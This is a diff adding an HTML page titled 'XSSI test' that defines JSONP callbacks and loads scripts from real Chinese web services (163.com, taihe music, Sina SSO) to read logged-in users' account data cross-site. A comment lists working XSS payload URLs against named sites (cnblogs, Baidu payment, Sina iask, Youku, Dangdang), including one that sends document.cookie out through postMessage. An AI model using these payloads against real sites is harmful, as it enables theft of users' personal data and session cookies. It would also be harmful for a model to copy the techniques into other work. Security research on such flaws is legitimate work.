@@ -1,0 +1,66 @@
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>XSSI test</title>
+</head>
+
+<body>
+  <h3>XSSI test</h3>
+  <div id="div1"></div>
+  <script>
+    var logger = (jsonp, obj) => {
+      console.log(jsonp, obj);
+      var div1 = document.createElement("div");
+      div1.innerText = jsonp + ":" + JSON.stringify(obj);
+      document.getElementById("div1").appendChild(div1);
+    };
+
+    var jsonpCallbacks = [
+      "jsonp_1576488793844",
+      "jQuery1520464738980041697",
+      "jQuery1520464738980"
+    ];
+
+    jsonpCallbacks.forEach(jsonp => {
+      window[jsonp] = obj => logger(jsonp, obj);
+    });
+
+    // var jsonp_1576488793844 = obj => logger(obj);
+    // var jQuery1520464738980041697 = obj => logger(obj);
+    // var jQuery1520464738980 = obj => logger(obj);
+  </script>
+  <script src="http://comment.api.163.com/api/v1/products/a2869674571f77b5a0867c3d71db5856/users/myInfo?ibc=newspc&callback=jsonp_1576488793844&_=1576488793845"></script>
+  <script src="http://musicapi.taihe.com/v1/restserver/ting?from=web&format=json&param=LSybM0sdw2aqEfumhdonnx8fVeIHBQtuiPCKUtmcDzyQAMZmL9gayz8xP%2FHmDp%2BH&timestamp=1574934266&sign=6d4fb00655a40b21407243b6be7274a4&method=baidu.ting.ugccenter.getUserBaseInfo&callback=jQuery1520464738980041697&_=1600321407103"></script>
+  <script src="https://login.sina.com.cn/sso/prelogin.php?entry=weibo&su=&rsakt=mod&client=ssologin.js(v1.4.19)&_=1600321407104&callback=jQuery1520464738980"></script>
+
+
+  <!-- 
+    XSSI+XSS: 
+
+    https://hudong.vip.youku.com/act/mili/download.html?mobile=1&download=javascript:new%20Function(name)();//https://down2.uc.cn///https://itunes.apple.com/app
+
+    https://wz.cnblogs.com/create?t=xxxx&u=%22%3E%3Csvg/onload=eval(name)%3E&c=&i=0
+
+    https://account.cnblogs.com/signin?ReturnUrl=https%3A%2F%2Fwz.cnblogs.com%2Fcreate%3Ft%3Dxxxx%26u%3D%2522%253E%253Csvg%2Fonload%3Deval(name)%253E%26c%3D%26i%3D0
+
+    https://zhifu.baidu.com/proxy/req/newcashier?cityId=&customerId=55&defaultResPage=0&deviceType=3&extData=&ext_store_no=&failUrl=&imei=&itemInfo=[{%22id%22:%22IPRQZ1598593080ba981c084142%22,%22number%22:1,%22price%22:10000,%22name%22:%221%22}]&mobile=&notifyUrl=http://quzheng.baidu.com/iprweb/v1/pay_status&orderCreateTime=1598593081&orderExpireTime=&orderId=IPRQZ1598593080ba981c084142&originalAmount=1&passScope=&passuid=&payAmount=1&returnUrl=http://quzheng.baidu.com/iprweb/v1/pay_return&sdk=0&sdkStyle=0&service=Cashier&sourceApp=&spData=&tag=&title=%3C/script%3E%3Cscript%3Eeval(window.name)%3C/script%3E&tn=&tpl=2&url=&signType=md5&sign=659ff744e50cbe1ceb4892af43d9f7f6
+   
+    https://m.iask.sina.com.cn/cas/logins?domain=iask.sina.com.cn&businessSys=iask&channel=null&popup=show&clsId=undefined&fid=%22%3E%3Cscript%3Eeval(name)%3C/script%3E
+   
+    https://zhifu.baidu.com/proxy/req/newcashier?cityId=&customerId=55&defaultResPage=0&deviceType=3&extData=&ext_store_no=&failUrl=&imei=&itemInfo=[{%22id%22:%22IPRQZ1598593080ba981c084142%22,%22number%22:1,%22price%22:10000,%22name%22:%221%22}]&mobile=&notifyUrl=http://quzheng.baidu.com/iprweb/v1/pay_status&orderCreateTime=1598593081&orderExpireTime=&orderId=IPRQZ1598593080ba981c084142&originalAmount=1&passScope=&passuid=&payAmount=1&returnUrl=http://quzheng.baidu.com/iprweb/v1/pay_return&sdk=0&sdkStyle=0&service=Cashier&sourceApp=&spData=&tag=&title=%3C/script%3E%3Cscript%3Eeval(window.name)%3C/script%3E&tn=&tpl=2&url=&signType=md5&sign=659ff744e50cbe1ceb4892af43d9f7f6
+    https://m.iask.sina.com.cn/cas/logins?domain=iask.sina.com.cn&businessSys=iask&channel=null&popup=show&clsId=undefined&fid=%22%3E%3Cscript%3Eeval(name)%3C/script%3E
+
+    http://databack.dangdang.com/dde.php?platform=pc&type=3&url=http%253A%252F%252Fwww.dangdang.com%252F&charset=GBK&perm_id=20200530121832924211210288241440628&page_id=mix_317715&website=dangdang.com&expose=%255B%2522mix_317715.3208542%252C9339%252C9354..%2522%252C%2522mix_317715.3208542%252C9339%252C9356..%2522%252C%2522mix_317715.3208542%252C9339%252C9356%252C9341..%2522%252C%2522mix_317715.3208542%252C9339%252C9356%252C9342.1.%2522%252C%2522mix_317715.3208542%252C9339%252C9356%252C9342.2.%2522%252C%2522mix_317715.3208542%252C9339%252C9356%252C9342.3.%2522%252C%2522mix_317715.3208542%252C9339%252C9356%252C9342.4.%2522%252C%2522mix_317715.3208542%252C9339%252C9356%252C9342.5.%2522%252C%2522mix_317715.3208542%252C9339%252C9356%252C9342.6.%2522%252C%2522mix_317715.3208542%252C9339%252C9356%252C9342.7.%2522%255D&callback=%3Ciframe/src=javascript:eval(%22window.parent.window.parent.postMessage({source:%20//%22dangdang//%22,%20d:%20document.cookie},%20//%22*//%22);%22)%3E
+
+    https://api.m.jd.com/client.action?functionId=getBabelProductPaged&body=%7b%22%73%65%63%6f%6e%64%54%61%62%49%64%22%3a%22%30%30%31%35%35%35%35%34%37%30%38%39%33%5f%30%33%37%32%36%36%30%30%5f%22%2c%22%74%79%70%65%22%3a%22%30%22%2c%22%70%61%67%65%4e%75%6d%22%3a%22%31%22%2c%22%6d%69%74%65%6d%41%64%64%72%49%64%22%3a%22%22%2c%22%67%65%6f%22%3a%7b%22%6c%6e%67%22%3a%22%22%2c%22%6c%61%74%22%3a%22%22%7d%2c%22%61%64%64%72%65%73%73%49%64%22%3a%22%22%2c%22%70%6f%73%4c%6e%67%22%3a%22%22%2c%22%70%6f%73%4c%61%74%22%3a%22%22%2c%22%66%6f%63%75%73%22%3a%22%22%2c%22%69%6e%6e%65%72%41%6e%63%68%6f%72%22%3a%22%22%7d&screen=2799*1208&client=wh5&clientVersion=1.0.0&sid=&uuid=&area=&_=1585823068850&callback=jsonp1 
+
+    https://home.51cto.com/index.php?s=/Index/getLoginStatus2015/reback/http%253A%252F%252Fwww.51cto.com%252F
+
+
+
+   -->
+</body>
+
+</html>
